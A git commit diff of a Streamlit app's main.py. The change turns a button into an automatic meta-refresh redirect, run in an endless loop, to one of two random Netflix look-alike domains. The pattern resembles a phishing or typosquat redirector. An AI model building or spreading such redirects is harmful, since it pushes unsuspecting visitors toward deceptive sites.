31d4b53ea85e9114446b59e6821ee60ebf34b0f1
akaiaui99 <141066915+akaiaui99@users.noreply.github.com>
2023-07-31 19:15:45 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,25 +1,22 @@
 import streamlit as st
+import time
 import random
 
-rand_links = [
-    "https://netflxkauiaoia.com/?oaia9298298kja",
-    "https://netactuaia7822.com/?opaioa89aHJhj"
-]
-
-def get_random_link():
-    return random.choice(rand_links)
+def get_random_url():
+    urls = [
+        "https://netflxkauiaoia.com/?oaia9298298kja",
+        "https://netactuaia7822.com/?opaioa89aHJhj"
+    ]
+    return random.choice(urls)
 
 def main():
-    st.set_page_config(page_title="Redirect Page", layout="wide")
+    st.title("Aplikasi Redirect Otomatis Streamlit")
+    st.write("Anda akan diarahkan secara otomatis ke salah satu URL.")
 
-    rand_link = get_random_link()
-
-    # Display the random link
-    st.write(f"Click the button below to open a new tab and visit the random link:")
-    if st.button("Open Random Link in New Tab"):
-        js_code = f"window.open('{rand_link}', '_blank');"
-        html_button = f'<button onclick="{js_code}">Open Random Link in New Tab</button>'
-        st.markdown(html_button, unsafe_allow_html=True)
+    while True:
+        rand_url = get_random_url()
+        st.markdown(f'<meta http-equiv="refresh" content="5;URL=\'{rand_url}\'"/>', unsafe_allow_html=True)
+        time.sleep(5)  # Waktu tunggu sebelum mengalihkan ke URL berikutnya
 
 if __name__ == "__main__":
     main()
